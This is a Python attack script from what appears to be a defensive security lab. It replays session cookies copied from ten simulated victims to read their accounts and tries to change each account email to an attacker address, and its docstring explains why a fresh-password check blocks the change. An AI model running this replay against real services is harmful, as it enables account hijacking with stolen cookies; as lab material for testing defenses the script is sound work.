"""
Round 4 attack: stolen session-cookie replay.

The hardest case, and the honest limit of login-time defenses. A large share of infostealer logs
come bundled with live session cookies (Recorded Future reported about 31 % for 2025). With the
cookie the attacker never logs in at all: no password, no code, no risk engine. They attach the
cookie and use the account.

This round shows both halves of the truth. The replay READS the account every time, because the
session is genuine. But the sensitive email change is refused, because Round 4 demands a fresh
proof of possession (the current password) that a cookie thief does not have. Stopping the read
itself needs device-bound sessions (DBSC), passkeys or session-anomaly models: W2 Ch7 and W4.

Setup (not the attack): each of the 10 victims signs in from home; the "stolen session" is the
`sid` and `did` cookies the malware copied from that browser.

    python attacks/round4_session_replay.py
"""

from _common import LabClient, report, victim_signs_in, world_pool

ACTOR = "bot:replay"
VICTIMS = range(200, 210)


def run():
    home, hosting = world_pool("home_fiber"), world_pool("hosting_asn")
    reads = sensitive = 0
    for n, i in enumerate(VICTIMS):
        victim = victim_signs_in(i, home[n])
        attacker = LabClient(ACTOR, ip=hosting[n])
        attacker.set_cookie("sid", victim.http.cookies.get("sid"))
        attacker.set_cookie("did", victim.http.cookies.get("did"))
        if attacker.get("/api/account").status_code == 200:
            reads += 1
        r = attacker.post("/api/account/email", json={"new_email": "attacker@example.test"})
        if r.status_code == 200 and r.json().get("ok"):
            sensitive += 1
    return {"attacker": ACTOR, "attempted": len(VICTIMS), "succeeded": sensitive, "accounts_read": reads,
            "sensitive_actions": sensitive, "accounts_taken_over": sensitive}


if __name__ == "__main__":
    out = run()
    print(f"[{ACTOR}] {out['attempted']} stolen sessions -> {out['accounts_read']} accounts read, "
          f"{out['sensitive_actions']} sensitive actions succeeded")
    report(**out)
